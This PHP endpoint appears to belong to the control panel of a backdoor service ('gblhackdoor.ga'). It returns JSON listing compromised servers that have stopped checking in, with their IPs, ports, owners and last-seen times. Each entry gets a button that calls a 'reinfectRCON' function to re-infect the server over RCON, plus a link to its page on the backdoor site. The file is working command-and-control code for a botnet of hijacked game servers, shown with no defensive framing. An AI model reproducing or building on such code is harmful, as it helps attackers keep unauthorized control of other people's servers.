<?php
header('Content-Type: application/json');
include('../class/include.php');
if (!Account::isAuthentified() || !CSRF::isAjaxRequest())
{
    die("Bad request");
}

$all_server_predata = Server::GetAllServer();
$list = [];

foreach ($all_server_predata as $data)
{    
	if ($data['last_update'] + 30 < time())
	{
		$owner = Account::GetUsername($data["userid"]);

	    $ip_data = explode(':', $data['server_ip']);

	    $button_off_inf = '<a href="http://gblhackdoor.ga/servers#'.$data['id'].'" class="btn btn-info btn-sm"><i class="fa fa-trash"></i>&nbsp;Page</a>';
	        

	    $button_rcon_rst = '<button onclick="reinfectRCON('.$data['id'].')" type="button" class="btn btn-primary btn-sm"><i class="fa fa-file-code-o"></i>&nbsp;Reconnecter via RCON</button>';
	        
	    array_push($list, ["DT_RowId" => "server-".$data['id'], $data['server_name'], $ip_data[0], $ip_data[1], date('d/m/Y à H:i:s', $data['last_update']), $owner, $button_rcon_rst . $button_off_inf]);
	}
}

echo json_encode(['data' => $list]);
?>